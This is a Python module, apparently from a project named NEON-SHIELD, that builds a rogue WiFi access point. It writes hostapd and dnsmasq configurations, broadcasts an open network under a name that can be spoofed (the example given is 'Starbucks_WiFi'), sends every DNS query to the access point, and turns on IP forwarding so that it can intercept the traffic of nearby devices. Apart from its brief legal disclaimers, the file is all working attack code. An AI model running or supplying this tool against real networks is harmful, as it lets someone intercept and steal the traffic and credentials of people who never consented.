"""
Rogue WiFi Access Point for NEON-SHIELD Phase 1.

Creates a fake WiFi network that nearby devices auto-connect to,
enabling transparent MITM of all their traffic.

⚠️ EDUCATIONAL USE ONLY — See README.md for legal disclaimer.
"""
import subprocess
import os
import logging
import time
import threading

logger = logging.getLogger(__name__)

HOSTAPD_CONFIG_TEMPLATE = """
interface={interface}
driver=nl80211
ssid={ssid}
channel={channel}
hw_mode=g
wmm_enabled=1
auth_algs=1
wpa=0
ignore_broadcast_ssid=0
"""

DNSMASQ_CONFIG_TEMPLATE = """
interface={interface}
dhcp-range=192.168.100.50,192.168.100.150,12h
dhcp-option=option:router,192.168.100.1
dhcp-option=option:dns-server,192.168.100.1
address=/#/192.168.100.1
"""


class RogueAccessPoint:
    """
    Creates and manages a rogue WiFi access point.

    ⚠️ WARNING: This tool performs active WiFi attacks that are illegal
    without explicit authorization. Use only on networks/devices you own
    or are explicitly authorized to test.
    """

    def __init__(self, interface: str, ssid: str, channel: int = 6, password: str = ""):
        """
        Initialize rogue AP.

        Args:
            interface: WiFi interface to use (e.g., 'wlan0')
            ssid: Network name to broadcast (e.g., 'Starbucks_WiFi')
            channel: WiFi channel (1-11 for 2.4GHz)
            password: Optional WPA2 password (empty = open network)
        """
        self.interface = interface
        self.ssid = ssid
        self.channel = channel
        self.password = password
        self.ap_ip = "192.168.100.1"
        self.ap_subnet = "192.168.100.0/24"

        self._hostapd_proc = None
        self._dnsmasq_proc = None
        self._stop_event = threading.Event()
        self._active = False

    def _check_root(self) -> bool:
        """Verify we're running as root (required for hostapd/dnsmasq)."""
        return os.geteuid() == 0

    def _check_dependencies(self) -> bool:
        """Check if hostapd and dnsmasq are installed."""
        for cmd in ["hostapd", "dnsmasq"]:
            try:
                subprocess.run(["which", cmd], capture_output=True, check=True)
            except subprocess.CalledProcessError:
                logger.error(f"Missing dependency: {cmd}")
                logger.info(f"Install with: sudo apt-get install {cmd}")
                return False
        return True

    def _setup_interface(self) -> bool:
        """Configure interface for AP mode."""
        try:
            # Bring interface up
            subprocess.run(
                ["ip", "link", "set", self.interface, "up"],
                capture_output=True, check=True
            )
            time.sleep(0.5)

            # Assign IP address
            subprocess.run(
                ["ip", "addr", "add", f"{self.ap_ip}/24", "dev", self.interface],
                capture_output=True, check=False  # May already exist
            )
            time.sleep(0.5)

            logger.info(f"Interface {self.interface} configured with IP {self.ap_ip}")
            return True
        except Exception as e:
            logger.error(f"Failed to configure interface: {e}")
            return False

    def _enable_ip_forwarding(self) -> bool:
        """Enable IP forwarding for NAT."""
        try:
            subprocess.run(
                ["sysctl", "-w", "net.ipv4.ip_forward=1"],
                capture_output=True, check=True
            )
            logger.info("IP forwarding enabled")
            return True
        except Exception as e:
            logger.error(f"Failed to enable IP forwarding: {e}")
            return False

    def _start_hostapd(self) -> bool:
        """Start hostapd to broadcast WiFi network."""
        try:
            config_path = f"/tmp/hostapd_{self.interface}.conf"

            config_content = HOSTAPD_CONFIG_TEMPLATE.format(
                interface=self.interface,
                ssid=self.ssid,
                channel=self.channel
            )

            with open(config_path, "w") as f:
                f.write(config_content)

            self._hostapd_proc = subprocess.Popen(
                ["hostapd", "-d", config_path],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            time.sleep(1)

            if self._hostapd_proc.poll() is not None:
                stderr = self._hostapd_proc.stderr.read()
                logger.error(f"hostapd failed to start: {stderr}")
                return False

            logger.info(f"hostapd started: Broadcasting '{self.ssid}' on channel {self.channel}")
            return True
        except Exception as e:
            logger.error(f"Failed to start hostapd: {e}")
            return False

    def _start_dnsmasq(self) -> bool:
        """Start dnsmasq for DHCP and DNS."""
        try:
            config_path = f"/tmp/dnsmasq_{self.interface}.conf"

            config_content = DNSMASQ_CONFIG_TEMPLATE.format(
                interface=self.interface
            )

            with open(config_path, "w") as f:
                f.write(config_content)

            self._dnsmasq_proc = subprocess.Popen(
                ["dnsmasq", "-C", config_path, "-d"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            time.sleep(1)

            if self._dnsmasq_proc.poll() is not None:
                stderr = self._dnsmasq_proc.stderr.read()
                logger.error(f"dnsmasq failed to start: {stderr}")
                return False

            logger.info("dnsmasq started: DHCP server active (192.168.100.50-150)")
            return True
        except Exception as e:
            logger.error(f"Failed to start dnsmasq: {e}")
            return False

    def start(self) -> bool:
        """Start the rogue access point."""
        if self._active:
            logger.warning("Access point already running")
            return False

        logger.info("🔴 Starting rogue access point...")
        logger.warning("⚠️  This will broadcast a fake WiFi network")

        # Checks
        if not self._check_root():
            logger.error("❌ Root privileges required (use sudo)")
            return False

        if not self._check_dependencies():
            logger.error("❌ Required tools not installed (hostapd, dnsmasq)")
            return False

        # Setup
        if not self._setup_interface():
            return False

        if not self._enable_ip_forwarding():
            return False

        # Start services
        if not self._start_hostapd():
            return False

        if not self._start_dnsmasq():
            self._stop_hostapd()
            return False

        self._active = True
        logger.info("✅ Rogue AP active!")
        logger.info(f"📡 Broadcasting: {self.ssid}")
        logger.info(f"📍 AP IP: {self.ap_ip}")
        logger.info(f"🔌 Clients will connect to: {self.ap_ip}")
        logger.warning("⚠️  All client traffic now routes through NEON-SHIELD")

        return True

    def _stop_hostapd(self) -> None:
        """Stop hostapd process."""
        if self._hostapd_proc:
            try:
                self._hostapd_proc.terminate()
                self._hostapd_proc.wait(timeout=5)
            except Exception as e:
                logger.warning(f"Failed to stop hostapd cleanly: {e}")

    def _stop_dnsmasq(self) -> None:
        """Stop dnsmasq process."""
        if self._dnsmasq_proc:
            try:
                self._dnsmasq_proc.terminate()
                self._dnsmasq_proc.wait(timeout=5)
            except Exception as e:
                logger.warning(f"Failed to stop dnsmasq cleanly: {e}")

    def _cleanup_interface(self) -> None:
        """Clean up interface configuration."""
        try:
            subprocess.run(
                ["ip", "addr", "del", f"{self.ap_ip}/24", "dev", self.interface],
                capture_output=True, check=False
            )
            logger.info(f"Interface {self.interface} cleaned up")
        except Exception as e:
            logger.warning(f"Failed to cleanup interface: {e}")

    def stop(self) -> bool:
        """Stop the rogue access point and clean up."""
        if not self._active:
            logger.warning("Access point not running")
            return False

        logger.info("Stopping rogue access point...")

        self._stop_hostapd()
        self._stop_dnsmasq()
        self._cleanup_interface()

        self._active = False
        logger.info("✅ Rogue AP stopped")
        return True

    def is_active(self) -> bool:
        """Check if rogue AP is running."""
        return self._active


def check_ap_requirements() -> tuple[bool, str]:
    """
    Check if system has requirements for rogue AP mode.

    Returns:
        (can_run: bool, message: str)
    """
    if os.geteuid() != 0:
        return False, "Root required (use sudo)"

    missing = []
    for cmd in ["hostapd", "dnsmasq"]:
        try:
            subprocess.run(["which", cmd], capture_output=True, check=True)
        except subprocess.CalledProcessError:
            missing.append(cmd)

    if missing:
        return False, f"Missing: {', '.join(missing)}. Install with: sudo apt-get install {' '.join(missing)}"

    return True, "All requirements met"
